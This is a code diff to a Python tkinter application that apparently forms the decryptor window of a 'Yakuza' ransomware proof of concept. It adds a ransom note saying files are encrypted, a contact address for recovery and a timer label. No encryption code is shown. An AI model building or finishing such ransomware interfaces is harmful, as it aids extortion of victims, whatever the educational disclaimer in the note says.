@@ -13,7 +13,7 @@ from json import dumps
 from os import makedirs, path, remove, walk
 # import tkinter as tk
 from tkinter import Toplevel, Entry, Label, Button, simpledialog, FLAT, messagebox, Tk, END, Listbox, Frame, BOTH, X, \
-    TOP, LEFT, Scrollbar
+    TOP, LEFT, Scrollbar, Text
 from uuid import uuid4
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
@@ -655,8 +655,75 @@ class DecryptorApp(Tk):
                 self.deletion_dialog = None # noqa
 
 
+    # Function to initialize the UI Components
     def initialize_ui(self):
-        pass
+        # Set ICON image of UI
+        self.iconbitmap(ICON_PATH)
+
+        # Open logo image and resize it
+        logoImage = Image.open(LOGO_PATH).resize((200, 200))
+        logoPhoto = ImageTk.PhotoImage(logoImage)
+
+        # Create Frame
+        frame = Frame(self, bg='black')
+        frame.pack(pady=(20, 20))
+
+        # Create Image label
+        # noinspection PyTypeChecker
+        logoLabel = Label(frame, image=logoPhoto, bg='black')
+        logoLabel.image = logoPhoto
+        logoLabel.pack(padx=(0, 20), side=LEFT)
+
+        # Add & Stylish Text, Label for Ransomware Notes
+        ransomNotes = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
+| Attention: Your Files Are Encrypted | \n\n
+This simulation is solely for educational purposes and must not be used maliciously.
+Users are fully accountable for their actions.
+Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key. \n\n
+=> To Recover Your Files <= \n
+Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
+
+        # Creating text widget for the ransomeNotes
+        ransomNoteLabel = Text(frame, bg='black', font=('Helvetica CE', 12), wrap='word', height=16, width=60, borderwidth=0)
+        ransomNoteLabel.pack(side=LEFT, padx=(10, 20))
+
+        # Creating the text with suitable tags
+        ransomNoteLabel.insert(END, " Proof of Concept: Yakuza Ransomware Simulation \n", "center_green")
+        ransomNoteLabel.insert(END, "| Attention: Your Files Are Encrypted | \n\n", "center_green")
+        ransomNoteLabel.insert(END, "This simulation is Only & Only for educational purposes and must not "
+                                       "be used maliciously. \n", "center_white")
+        ransomNoteLabel.insert(END, "Users are fully accountable for their actions. \n\n", "center_white")
+        ransomNoteLabel.insert(END, "Your files have been encrypted using state-of-the-art "
+                                       "encryption algorithms. To restore access to your data, "
+                                       "you must enter the decryption key. \n\n", "center_red")
+        ransomNoteLabel.insert(END, " ** To Recover Your Files: ** \n", "center_yellow")
+        ransomNoteLabel.insert(END, "Ping Us at => [ ransom@yakuzalock.xyz ]", "center_yellow")
+
+        # Configure the Tags set on the text widget
+        ransomNoteLabel.tag_configure("center",justify='center')
+        ransomNoteLabel.tag_configure("center_red",justify='center', foreground='red')
+        ransomNoteLabel.tag_configure("center_green",justify='center', foreground='green')
+        ransomNoteLabel.tag_configure("center_white",justify='center', foreground='white')
+        ransomNoteLabel.tag_configure("center_yellow",justify='center', foreground='gold')
+
+        # Apply tags for specif lines
+        ransomNoteLabel.tag_add("center", "1.0","1.end")
+        ransomNoteLabel.tag_add("center_green", "1.0","2.end")
+        ransomNoteLabel.tag_add("center_white", "3.0","5.end")
+        ransomNoteLabel.tag_add("center_red", "6.0","6.end")
+        ransomNoteLabel.tag_add("center_yellow", "8.0","9.end")
+
+        # Apply Configs and Setups
+        ransomNoteLabel.configure(state='disabled')
+
+        self.timerLabel = Label(self, text="", fg='red', bg='black', font=('Helvetica CE', 12))
+        self.timerLabel.pack(pady=(10, 10))
+
+        # Call UI Components Functions
+        self.setup_key_frame()
+        self.setup_log_frame()
+        self.setup_progress_frame()
+
 
     def on_close_window(self):
         pass
@@ -697,7 +764,11 @@ class DecryptorApp(Tk):
         scrollbar.pack(side="right", fill="y")
         self.logListbox.config(yscrollcommand=scrollbar.set)
 
+    def setup_key_frame(self):
+        pass
 
+    def setup_progress_frame(self):
+        pass
 
 # if __name__ == "__main__":
 #     # Create an instance of the EncryptionTool class
